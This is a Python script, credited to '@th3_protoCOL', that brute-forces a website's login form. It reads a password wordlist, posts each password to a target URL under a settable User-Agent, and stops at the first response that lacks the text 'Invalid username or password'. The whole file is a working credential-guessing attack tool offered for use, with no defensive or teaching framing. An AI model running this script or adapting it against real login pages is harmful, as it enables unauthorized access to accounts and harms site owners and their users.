from __future__ import print_function
import requests, argparse, sys

parser = argparse.ArgumentParser(description="Simple python login brute force script by @th3_protoCOL")
parser.add_argument('--url', help="Website to target", required=True)
parser.add_argument('--wordlist', help="Wordlist of passwords to attempt", required=True)
parser.add_argument('--agent', help="User agent string to send the login as",default="Agent:Mozilla/5.0")
args = parser.parse_args()	

agent = args.agent
url = args.url
wordlist = args.wordlist
headers = {'User-Agent':agent}

def main():
    print("[*] User-Agent: "+agent)
    print("[*] URL: "+ url)
    print("[*] Wordlist: "+wordlist)
    with open(args.wordlist, 'r') as f:
        words = f.read().split()
        print("[*] Starting attack...")
        for word in words:
            send(word)

def send(password):
    payload = {'password':password,}			#TODO: Improve this
    r = requests.post(url,headers=headers,data=payload)
    if "Invalid username or password" in r.text:	#TODO: Improve this
        print("[-] Incorrect: "+password)
    else:
        print("[+] Correct: "+password)			#TODO: Add option to keep going
        sys.exit(0)

main()

